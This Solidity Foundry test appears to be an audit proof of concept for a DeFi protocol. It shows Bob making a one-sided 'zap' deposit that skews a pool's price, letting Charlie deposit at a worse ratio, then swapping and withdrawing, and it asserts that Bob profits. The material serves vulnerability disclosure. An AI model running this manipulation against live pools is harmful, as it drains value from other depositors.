// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.22;

import "../../dev/Deployment.sol";


contract ZapSwap is Deployment
{
	bytes32[] public poolIDs;
	bytes32 public pool1;

	IERC20 public token1;
	IERC20 public token2;

	address public constant alice = address(0x1111);
	address public constant bob = address(0x2222);
	address public constant charlie = address(0x3333);

	uint256 token1DecimalPrecision;
	uint256 token2DecimalPrecision;

	function setUp() public
	{
		// If $COVERAGE=yes, create an instance of the contract so that coverage testing can work
		// Otherwise, what is tested is the actual deployed contract on the blockchain (as specified in Deployment.sol)
		if ( keccak256(bytes(vm.envString("COVERAGE" ))) == keccak256(bytes("yes" )))
			initializeContracts();


		grantAccessAlice();
		grantAccessBob();
		grantAccessCharlie();
		grantAccessDeployer();
		grantAccessDefault();

		finalizeBootstrap();

		vm.prank(address(daoVestingWallet));
		salt.transfer(DEPLOYER, 1000000 ether);

		token1DecimalPrecision = 18;
		token2DecimalPrecision = 18;

		token1 = new TestERC20("TEST", token1DecimalPrecision);
		token2 = new TestERC20("TEST", token2DecimalPrecision);

		pool1 = PoolUtils._poolID(token1, token2);

		poolIDs = new bytes32[](1);
		poolIDs[0] = pool1;

		// Whitelist the _pools
		vm.startPrank( address(dao) );
		poolsConfig.whitelistPool(token1, token2);
		vm.stopPrank();

		vm.prank(DEPLOYER);
		salt.transfer( address(this), 100000 ether );


		salt.approve(address(liquidity), type(uint256).max);

		vm.startPrank(alice);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		vm.stopPrank();

		vm.startPrank(bob);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		token1.approve(address(pools), type(uint256).max);
		token2.approve(address(pools), type(uint256).max);
		vm.stopPrank();

		vm.startPrank(charlie);
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		token1.approve(address(pools), type(uint256).max);
		token2.approve(address(pools), type(uint256).max);
		vm.stopPrank();

		// DAO gets some salt and pool lps and approves max to staking
		token1.transfer(address(dao), 1000 * 10**token1DecimalPrecision);
		token2.transfer(address(dao), 1000 * 10**token2DecimalPrecision);
		vm.startPrank(address(dao));
		token1.approve(address(liquidity), type(uint256).max);
		token2.approve(address(liquidity), type(uint256).max);
		vm.stopPrank();
	}

	// Convenience function
	function totalSharesForPool( bytes32 poolID ) public view returns (uint256)
	{
		bytes32[] memory _pools2 = new bytes32[](1);
		_pools2[0] = poolID;

		return liquidity.totalSharesForPools(_pools2)[0];
	}

	function test_t0x1c_ZapSwapGain() public {
		// ******************************* SETUP **************************************
		// Give Alice, Bob & Charlie some tokens for testing
		token1.transfer(alice, 100 ether);
		token2.transfer(alice, 100 ether);
		token1.transfer(bob, 1 ether);
		token2.transfer(bob, 1 ether);
		token1.transfer(charlie, 100 ether);
		token2.transfer(charlie, 100 ether);

		assertEq(totalSharesForPool( pool1 ), 0, "Pool should initially have zero liquidity share" );
		assertEq(liquidity.userShareForPool(alice, pool1), 0, "Bob's initial liquidity share should be zero");
		assertEq(liquidity.userShareForPool(bob, pool1), 0, "Bob's initial liquidity share should be zero");
		assertEq(liquidity.userShareForPool(charlie, pool1), 0, "Charlie's initial liquidity share should be zero");
		assertEq( token1.balanceOf( address(pools)), 0, "liquidity should start with zero token1" );
		assertEq( token2.balanceOf( address(pools)), 0, "liquidity should start with zero token2" );

		// deposit ratio of 1:1 i.e token1's price is 1 times that of token2
		uint256 addedAmount1 = 100 ether;
		uint256 addedAmount2 = 100 ether;

		// Alice adds liquidity in the correct ratio, as the first depositor
		vm.prank(alice);
		uint256 addedLiquidityAlice = liquidity.depositLiquidityAndIncreaseShare( token1, token2, addedAmount1, addedAmount2, addedAmount1, addedAmount2, addedAmount1 + addedAmount2, block.timestamp, false );
		console.log("initial balances: token1 = %s, token2 = %s", token1.balanceOf( address(pools)), token2.balanceOf( address(pools)));
		emit log_named_decimal_uint ("Initial ratio of token2:token1 =", 1e18 * token2.balanceOf(address(pools)) / token1.balanceOf(address(pools)), 18);

		assertEq(liquidity.userShareForPool(alice, pool1), addedLiquidityAlice, "Alice's share should have increased" );
		assertEq( token1.balanceOf( address(pools)), addedAmount1, "Tokens were not deposited into the pool as expected" );
		assertEq( token2.balanceOf( address(pools)), addedAmount2, "Tokens were not deposited into the pool as expected" );
		assertEq(totalSharesForPool( pool1 ), addedLiquidityAlice, "totalShares mismatch after Alice's deposit" );
		uint256 bobInitialBalance = token1.balanceOf(bob) + token2.balanceOf(bob); // In Dollar terms
		// ******************************* SETUP ENDS **************************************

		console.log("\n\n***************************** Bob Zap-Swap Attack ************************************\n");

		vm.prank(bob);
		uint256 addedLiquidityBob = liquidity.depositLiquidityAndIncreaseShare( token1, token2, 1 ether, 0, 0, 0, 0, block.timestamp, true );
		console.log("new balances: token1 = %s, token2 = %s", token1.balanceOf( address(pools)), token2.balanceOf( address(pools)));
		emit log_named_decimal_uint ("Manipulated ratio of token2:token1 =", 1e18 * token2.balanceOf(address(pools)) / token1.balanceOf(address(pools)), 18);

		// Charlie transaction goes through now which adds liquidity with suitable slippage parameters
		vm.prank(charlie);
		// @audit-info : 1% slippage for token2
		uint256 charlieAddedLiquidity = liquidity.depositLiquidityAndIncreaseShare( token1, token2, 100 ether, 100 ether, 100 ether, 99 ether, 199 ether, block.timestamp, false );

		console.log( "CHARLIE ADDED LP: ", charlieAddedLiquidity );
		console.log( "CHARLIE USED TOKEN 1: ", 100 ether - token1.balanceOf(charlie) );
		console.log( "CHARLIE USED TOKEN 2: ", 100 ether - token2.balanceOf(charlie) );

		vm.warp( block.timestamp + 1 hours );


		// Bob swaps
		vm.prank(bob);
		(uint256 swappedOut) = pools.depositSwapWithdraw(token2, token1, 1 ether, 0, block.timestamp);
		emit log_named_decimal_uint("token1 swappedOut in exchange for 1 ether of token2 (should be greater than 1 ether) =", swappedOut, 18);

		skip(1 hours);
		vm.prank(bob);
		liquidity.withdrawLiquidityAndClaim(token1, token2, addedLiquidityBob, 0, 0, block.timestamp);

		uint256 bobFinalBalance = token1.balanceOf(bob) + token2.balanceOf(bob); // In Dollar terms
		assertGt( bobFinalBalance, bobInitialBalance, "Bob did not profit" );
		console.log("\nProfit made by Bob = $", bobFinalBalance - bobInitialBalance);

		vm.prank(charlie);
		liquidity.withdrawLiquidityAndClaim(token1, token2, charlieAddedLiquidity, 0, 0, block.timestamp);
		console.log( "CHARLIE TOKEN BALANCE 1: ", token1.balanceOf(charlie) );
		console.log( "CHARLIE TOKEN BALANCE 2: ", token2.balanceOf(charlie) );

	}
}